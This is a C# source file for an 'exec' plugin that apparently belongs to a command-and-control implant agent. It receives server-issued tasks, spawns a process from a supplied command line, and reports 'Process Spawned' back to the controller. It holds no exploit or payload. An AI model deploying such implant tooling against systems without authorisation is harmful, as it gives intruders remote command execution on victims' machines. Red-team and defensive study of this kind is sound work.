using Workflow.Contracts;
using System.Text.Json;
using Workflow.Models;

namespace Workflow
{
    public class Plugin : IModule
    {
        public string Name => "exec";
        private IDataBroker messageManager { get; set; }
        private IRuntimeExecutor spawner { get; set; }

        public Plugin(PluginContext context)
        {
            this.messageManager = context.MessageManager;
            this.spawner = context.Spawner;
        }

        public async Task Execute(ServerJob job)
        {
            DebugLog.Log($"Executing {Name} [{job.task.id}]");
            ExecArgs args = JsonSerializer.Deserialize<ExecArgs>(job.task.parameters);

            if(args is null)
            {
                DebugLog.Log($"{Name} args is null [{job.task.id}]");
                messageManager.AddTaskResponse(new TaskResponse()
                {
                    task_id = job.task.id,
                    user_output = "Args is null",
                    completed = true
                });
                return;
            }

            if (string.IsNullOrEmpty(args.commandline))
            {
                DebugLog.Log($"{Name} missing commandline [{job.task.id}]");
                messageManager.AddTaskResponse(new TaskResponse()
                {
                    task_id = job.task.id,
                    user_output = "Missing commandline",
                    completed = true
                });
                return;
            }

            DebugLog.Log($"{Name} spawning process [{job.task.id}]");
            if (await this.spawner.Spawn(args.getSpawnOptions(job.task.id)))
            {
                messageManager.AddTaskResponse(new TaskResponse()
                {
                    task_id = job.task.id,
                    user_output = "Process Spawned",
                    completed = true
                });
                DebugLog.Log($"{Name} completed [{job.task.id}]");
                return;
            }
        }
    }
}
